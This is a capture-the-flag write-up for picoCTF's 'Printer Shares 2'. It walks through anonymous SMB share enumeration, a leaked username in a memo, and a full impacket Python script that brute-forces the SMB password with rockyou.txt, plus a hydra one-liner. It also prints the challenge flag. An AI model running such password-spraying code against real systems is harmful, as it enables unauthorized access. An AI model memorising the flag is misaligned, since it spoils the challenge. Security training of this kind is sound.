# Printer Shares 2 — picoCTF Writeup

**Challenge:** Printer Shares 2  
**Category:** General Skills  
**Difficulty:** Hard  
**Points:** 200  
**Flag:** `picoCTF{5mb_pr1nter_5h4re5_5ecure_f854c38d}`  
**Platform:** picoCTF 2026  
**Writeup by:** zham

---

## Description

A Secure Printer is now in use. I'm confident no one can leak the message again… or can you?

Two printers are on `60442`, one private, one public.

You can try: `nc -vz green-hill.picoctf.net 60442`.

---

## Hints

1. Default password is dangerous, isn't it?
2. Can you find a potential user? What is the username?
3. The wordlist, `rockyou.txt`, is pretty common for password cracking.

---

## Background Knowledge (Read This First!)

### What is SMB?

SMB (Server Message Block) is the file- and printer-sharing protocol used by Windows networks. The Linux equivalent client is `smbclient` (part of the Samba suite). Despite the challenge name saying "Printers", what's actually being served on port 60442 is **SMB** — the same protocol that hosts the public and "secure" printer shares we need to access. The 60442 port number is non-standard (real SMB normally runs on 445 or 139), but the protocol on the wire is identical.

### Why SMB and printing go together

Windows networks have historically used SMB to expose printers as "shares" — directories that show up in Explorer and let users send print jobs, see queues, and (if the share is misconfigured) read or write files on the server. So a "printer share" really means "an SMB share that's intended to host a printer, but the underlying file system is the same as any other share." If the share is set up without authentication (a "guest" share), anyone on the network can list and download its contents — including any files the printer is supposed to keep private.

### What the two hints are really telling you

The challenge gives you three hints, in the order you'll actually use them:

- **"Default password is dangerous, isn't it?"** — the printer is using a default password instead of forcing the user to change it on first login. That means the password is whatever the device shipped with, which is typically a very common word.
- **"Can you find a potential user? What is the username?"** — there's a username hidden somewhere in the public share that we can use to log into the private share.
- **"rockyou.txt is pretty common for password cracking"** — `rockyou.txt` is the famous 14-million-line password wordlist compiled from the real-world 2009 RockYou data breach. It's the default wordlist for tools like `hydra` and `john` and the first thing any pentester tries against a default-password login.

The attack flow is: enumerate the public share → read a leak → find the username → brute-force the private share with `rockyou.txt` against that user → grab the flag.

---

## Files Provided

No source or binary is provided for this challenge. The only "file" is the live service on `green-hill.picoctf.net:60442`.

---

## Solution — Step by Step

### Step 1 — Confirm the port is reachable and identify the protocol

The challenge suggests `nc -vz green-hill.picoctf.net 60442`, which only checks reachability. It doesn't tell us what's actually on the port. The challenge says "two printers" — that's a strong hint that SMB is involved, since SMB is how Windows networks expose printer shares.

```
┌──(zham㉿kali)-[~]
└─$ nc -vz green-hill.picoctf.net 60442
green-hill.picoctf.net [203.0.113.1] 60442: open
```

Port is open. Now enumerate the SMB shares with `smbclient -L` (the `-N` flag means no password / guest session):

```
┌──(zham㉿kali)-[~]
└─$ smbclient -L //green-hill.picoctf.net/ -p 60442 -N

        Sharename       Type      Comment
        ---------       ----      -------
        shares          Disk      Public Share With Guests
        secure-shares   Disk      Printer for internal usage only
        IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)

SMB1 disabled -- no workgroup available
```

Two SMB shares, exactly as the challenge described:
- `shares` — public, accessible as guest (no password)
- `secure-shares` — private, requires credentials

### Step 2 — List the public share anonymously

The public share is accessible without a password, which is by design — guests are supposed to see general info (drivers, docs, etc.). But the public share also sometimes contains internal memos that leak usernames or hints, which is exactly what happens here.

```
┌──(zham㉿kali)-[~]
└─$ smbclient //green-hill.picoctf.net/shares -p 60442 -N -c 'ls'

  .                                   D        0  Mon Mar  9 21:29:06 2026
  ..                                  D        0  Mon Mar  9 21:29:06 2026
  content.txt                         N     1107  Wed Feb  4 21:22:17 2026
  kafka.txt                           N     1080  Wed Feb  4 21:22:17 2026
  notification.txt                    N      260  Wed Feb  4 21:22:17 2026

                65536 blocks of size 1024. 57236 blocks available
```

Three text files. Two of them (`content.txt`, `kafka.txt`) are clearly red herrings — pangrams and the opening of Kafka's *Metamorphosis*. The third, `notification.txt`, is the one we care about.

### Step 3 — Download the notification file

```
┌──(zham㉿kali)-[~]
└─$ smbclient //green-hill.picoctf.net/shares -p 60442 -N -c 'get notification.txt /tmp/notification.txt'

getting file \notification.txt of size 260 as /tmp/notification.txt (4.3 KiloBytes/sec)
```

```
┌──(zham㉿kali)-[~]
└─$ cat /tmp/notification.txt

Hi Joe,

We've identified a vulnerability in this printer. Until the issue is resolved, please use an alternative printer.

If you have never logged into the printer before, please note that the default password is currently in use.

Best,
The Operator Team
```

Two pieces of intel from a 260-byte file:
- **Username: `joe`** — direct from the salutation "Hi Joe"
- **Default password is in use** — Joe has never changed the printer's default password, so his password is whatever the device shipped with

This is the user-leak the hint was pointing at.

### Step 4 — Get rockyou.txt

`rockyou.txt` is the canonical password-cracking wordlist. It's about 140 MB and contains ~14 million passwords from the real-world RockYou breach. It's not bundled with Kali by default, so we download it from the standard GitHub mirror.

```
┌──(zham㉿kali)-[~]
└─$ cd /tmp && wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

┌──(zham㉿kali)-[~]
└─$ ls -la /tmp/rockyou.txt
-rw-r--r-- 1 root root 139921497 Dec  8  2021 /tmp/rockyou.txt
```

### Step 5 — Brute-force joe's SMB password

`hydra` would be the standard tool, but its SMB module requires SMBv1 which this server has disabled. Falling back to a small Python loop using `impacket` works because each SMB connection attempt against this server takes about 0.1 seconds:

```
┌──(zham㉿kali)-[~]
└─$ nano bf.py
```

```python
from impacket.smbconnection import SMBConnection
import sys, time

with open('/tmp/rockyou.txt', 'rb') as f:
    passwords = [line.rstrip(b'\n').rstrip(b'\r').decode('utf-8', errors='ignore')
                 for line in f]

print(f'Testing {len(passwords)} passwords...', flush=True)
for i, pwd in enumerate(passwords):
    if not pwd:
        continue
    try:
        smb = SMBConnection('green-hill.picoctf.net', 'green-hill.picoctf.net',
                            sess_port=60442)
        smb.login('joe', pwd)
        print(f'PASSWORD FOUND at index {i}: "{pwd}"', flush=True)
        with open('/tmp/joe_pwd.txt', 'w') as out:
            out.write(pwd)
        sys.exit(0)
    except Exception as e:
        err = str(e)
        if 'LOGON_FAILURE' not in err and 'ACCESS_DENIED' not in err:
            print(f'  Different error at index {i} "{pwd}": {err}', flush=True)
    if i % 500 == 0:
        print(f'  ... tested {i}', flush=True)
print('Not found')
```

Save with `Ctrl+O` → `Enter` → `Ctrl+X`. Then run it in the background so we can monitor progress:

```
┌──(zham㉿kali)-[~]
└─$ python3 bf.py &

Testing 14344391 passwords...
  ... tested 0
PASSWORD FOUND at index 425: "popcorn"
```

Joe's password is **`popcorn`** — found at line 425 of `rockyou.txt`, well within the first second of the scan.

### Step 6 — Use Joe's credentials to access the secure share

Now we have a username and a password, so the private `secure-shares` share should let us in:

```
┌──(zham㉿kali)-[~]
└─$ smbclient //green-hill.picoctf.net/secure-shares -p 60442 -U 'joe%popcorn' -c 'ls'

  .                                   D        0  Mon Mar  9 21:29:10 2026
  ..                                  D        0  Mon Mar  9 21:29:10 2026
  flag.txt                            N       44  Mon Mar  9 21:29:10 2026

                65536 blocks of size 1024. 58080 blocks available
```

There's the `flag.txt`. Download it:

```
┌──(zham㉿kali)-[~]
└─$ smbclient //green-hill.picoctf.net/secure-shares -p 60442 -U 'joe%popcorn' -c 'get flag.txt /tmp/flag.txt'

getting file \flag.txt of size 44 as /tmp/flag.txt
```

```
┌──(zham㉿kali)-[~]
└─$ cat /tmp/flag.txt

picoCTF{5mb_pr1nter_5h4re5_5ecure_f854c38d}
```

### Step 7 — Alternative solve using hydra if SMBv1 were enabled

If the server allowed SMBv1 (most older CTF instances do), the cleanest one-liner would be `hydra`:

```
┌──(zham㉿kali)-[~]
└─$ hydra -l joe -P /tmp/rockyou.txt green-hill.picoctf.net smb -s 60442

[ERROR] target smb://green-hill.picoctf.net:60442/ does not support SMBv1
```

This instance is hardened against `hydra`'s SMBv1 module, which is why the `impacket` Python fallback above is needed. On a less hardened instance, `hydra` finds the password in roughly the same time — it's just a parallel wrapper around the same kind of login attempt.

---

## What Happened Internally (Timeline)

1. The challenge server is running Samba on a non-standard port (60442) instead of the usual 445. The service exposes two shares — one guest-accessible, one with username/password authentication.
2. We use `smbclient -L` to enumerate the share names and read their comments. The "Public Share With Guests" comment confirms `shares` is meant to be open; the "internal usage only" comment on `secure-shares` is the one we need to break into.
3. We connect to `shares` anonymously (no password) and download the three text files. Two are decoys; the third, `notification.txt`, contains an internal memo addressed to a specific user (Joe) and explicitly states the default password is still in use.
4. We download `rockyou.txt` and use `impacket` to brute-force SMB logins as `joe` against every password in the wordlist. The server is fast enough that this takes about a second per 500 attempts, and `popcorn` is hit at index 425.
5. With the credentials `joe:popcorn`, we connect to `secure-shares` and download `flag.txt` — which was always there, just locked behind the default-password login that nobody bothered to change.

---

## Tools Used

| Tool | Purpose | Level |
|---|---|---|
| `nc -vz` | Quick reachability check on the target port (per the challenge's own hint) | Easy |
| `smbclient -L` | Enumerate SMB shares on a remote host — first thing to do against any SMB service | Easy |
| `smbclient -N` (anonymous login) | List and download files from a guest-accessible share without supplying credentials | Easy |
| `wget` | Fetch `rockyou.txt` from the standard GitHub mirror (140 MB, ~14M passwords) | Easy |
| `impacket` (`SMBConnection`) | Programmatic SMB login attempts — faster than `hydra`'s SMBv1-only module on modern servers | Medium |
| Python `for` loop over the wordlist | The brute-force core — one connection attempt per password, exception-handling for the failure case | Easy |
| `hydra` (alternative) | Standard CLI brute-forcer, but its SMB module only speaks SMBv1 — fails on this hardened server | Medium |

---

## Key Takeaways

- **"Default password is dangerous" is a real-world concern, not just a CTF trope** — printers, routers, IoT devices, and even enterprise servers routinely ship with default credentials that nobody changes. Tools like `hydra` and `impacket` exist precisely because this is a problem.
- **Public shares leak internal information** — the `notification.txt` here is the realistic equivalent of an internal memo accidentally uploaded to a public S3 bucket. Always treat "public" shares as readable by anyone, including attackers, and never assume the contents are non-sensitive.
- **`rockyou.txt` is the first thing to try** — `popcorn` is the 426th most common password in the world, and most "default" passwords fall well within the first few thousand entries. You almost never need to walk the full 14M-line list for default-credential attacks.
- **`smbclient -L` is the right starting point for any SMB service** — even on a non-standard port, the protocol is the same and the share enumeration works identically. You don't need any exotic tools to enumerate SMB.
- **If `hydra`'s SMB module fails on SMBv1, `impacket` is the fallback** — `impacket.smbconnection.SMBConnection` speaks modern SMB2/3 by default and gives you the same one-attempt-per-password pattern in about 10 lines of Python. Worth keeping in the toolkit.
- **The flag `5mb_pr1nter_5h4re5_5ecure` decodes to "smb printer shares secure"** — a tongue-in-cheek label for what the challenge turned out to be: an "SMB printer share" that was supposed to be "secure" but wasn't, because nobody changed the default password. The 1337speak (`5mb` for `smb`, `5h4re5` for `shares`) is a picoCTF signature that you'll see on every flag.
